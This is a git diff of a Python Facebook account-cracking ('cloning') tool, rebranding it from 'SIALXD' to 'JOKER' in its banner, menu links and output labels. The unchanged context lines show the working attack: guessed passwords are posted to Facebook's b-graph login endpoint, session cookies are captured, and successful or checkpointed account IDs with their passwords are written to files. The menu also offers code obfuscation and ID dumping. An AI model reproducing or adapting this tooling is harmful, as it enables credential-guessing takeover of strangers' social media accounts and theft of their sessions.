@@ -100,22 +100,28 @@ oks=[]
 cps=[]
 loop=0
 logo=("""\033[1;37m 
-  db    db .d8888. .88b  d88.  .d8b.  d8b   db      
-  88    88 88'  YP 88'YbdP`88 d8' `8b 888o  88      
-  88    88 `8bo.   88  88  88 88ooo88 88V8o 88      
-  88    88   `Y8b. 88  88  88 88~~~88 88 V8o88      
-  88b  d88 db   8D 88  88  88 88   88 88  V888      
-  ~Y8888P' `8888Y' YP  YP  YP YP   YP VP   V8P \033[1;32mSIAL\033[1;37m 
-====================================================
-[â€¢] OWNER      : ANJAN LARKA 
-[â€¢] GITHUB     : M4STERMIND1 
+\033[1;39m======================================================
+\033[1;31m    ____   ____   ___    __ __________ ________    
+\033[1;31m    `MM'  6MMMMb  `MM    d'  `MMMMMMMMM `MMMMMMMb.  
+\033[1;39m      MM  8P    Y8  MM   d'   MM      \  MM    `Mb  
+\033[1;39m      MM 6M      Mb MM  d'    MM         MM     MM  
+\033[1;39m      MM MM      MM MM d'     MM    ,    MM     MM  
+\033[1;39m      MM MM      MM MMd'      MMMMMMM    MM    .M9  
+\033[1;39m      MM MM      MM MMYM.     MM    `    MMMMMMM9'  
+\033[1;39m      MM MM      MM MM YM.    MM         MM  \M\    
+\033[1;39m(8)   MM YM      M9 MM  YM.   MM         MM   \M\   
+\033[1;31m((   ,M9  8b    d8  MM   YM.  MM      /  MM    \M\  
+\033[1;31m YMMMM9    YMMMM9  _MM_   YM._MMMMMMMMM _MM_    \M\_
+\033[1;39m======================================================
+[â€¢] OWNER      : 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑
+[â€¢] GITHUB     : 𝐌𝐑 𝐉𝐎𝐊𝐄𝐑 
 [â€¢] STATUS     : FREE
 [â€¢] VERSION    : 6.0
-====================================================
+\033[1;39m======================================================
 [â€¢] ENJOY ALL ðŸ˜Š
-====================================================""")
+\033[1;39m======================================================""")
 def linex():
-	print(f'\033[1;37m====================================================')
+	print(f'\033[1;39m======================================================')
 def SIALZADA():
 		clear()
 		print(f'\033[1;37m [1] File Cloning (\033[1;32m All Country Working\033[1;37m )\n [2] Random Cloning \n [3] Gmail Cloning (ON) \n [4] Create File / Dump System \n [5] Marshal & Enc \n [6] Contact With Tool Owner\n [7] Follow My Page \n [8] Subscribe My YouTube Channel \n [9] WhatsApp group(\033[1;32mJoin\033[1;37m) \n [0] Exit')
@@ -142,7 +148,7 @@ def SIALZADA():
 			os.system('xdg-open https://www.facebook.com/profile.php?id=61550709630311')
 			SIALZADA()
 		elif shm =='8':
-			os.system('xdg-open https://youtube.com/@SIALXD_48')
+			os.system('xdg-open https://youtube.com/@JOKER_48')
 			SIALZADA()
 		elif shm =='9':
 			wp=('ENIBC9FIBwv0ozvzLCpVE6')
@@ -404,7 +410,7 @@ def rd1(ids,passlist):
 						ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
 						ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
 						cookie = f"sb={ssbb};{ckkk}"
-						print('\r\r\033[1;32m[SIALXD-OK] '+uid+' | '+pas)		                    
+						print('\r\r\033[1;32m[JOKER-OK] '+uid+' | '+pas)		                    
 						#print(' \33[1;96m[Cookies] == '+cookie)
 						file_path_ok = os.path.join(folder_path, 'SIALZADA_RANDOM_OK.txt')
 						file_path_cookies = os.path.join(folder_path, 'SIALZADA_COOKIES.txt')
@@ -415,7 +421,7 @@ def rd1(ids,passlist):
 						break
 				elif 'www.facebook.com' in po['error']['message']:
 						uid = str(po['error']['error_data']['uid'])
-					#	print(f'\r\r\33[1m\33[1;35m [SIALXD-CP] '+uid+' | '+pas+'\033[1;97m')
+					#	print(f'\r\r\33[1m\33[1;35m [JOKER-CP] '+uid+' | '+pas+'\033[1;97m')
 						file_path = os.path.join(folder_path, 'SIALZADA-CP.txt')
 						with open(file_path, 'a') as file:
 							file.write(uid+'|'+pas+'\n')
@@ -461,7 +467,7 @@ def api1(ids,names,passlist):
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
 					uid = str(po['uid'])
-					print('\r\r\033[1;32m [SIALXD-OK] '+uid+' | '+pas)
+					print('\r\r\033[1;32m [JOKER-OK] '+uid+' | '+pas)
 					linex()
 					file_path = os.path.join(folder_path, 'SIALZADA_FILE_OK.txt')
 					with open(file_path, 'a') as file:
@@ -470,8 +476,8 @@ def api1(ids,names,passlist):
 					break
 			elif 'www.facebook.com' in po['error']['message']:
 					uid = str(po['error']['error_data']['uid'])
-			#		print(f'\r\r\33[1m\33[1;35m [SIALXD-CP] '+uid+' | '+pas+'\033[1;97m')
-					file_path = os.path.join(folder_path, 'SIALXD-CP.txt')
+			#		print(f'\r\r\33[1m\33[1;35m [JOKER-CP] '+uid+' | '+pas+'\033[1;97m')
+					file_path = os.path.join(folder_path, 'JOKER-CP.txt')
 					with open(file_path, 'a') as file:
 						file.write(uid+'|'+pas+'\n')
 					cps.append(uid)
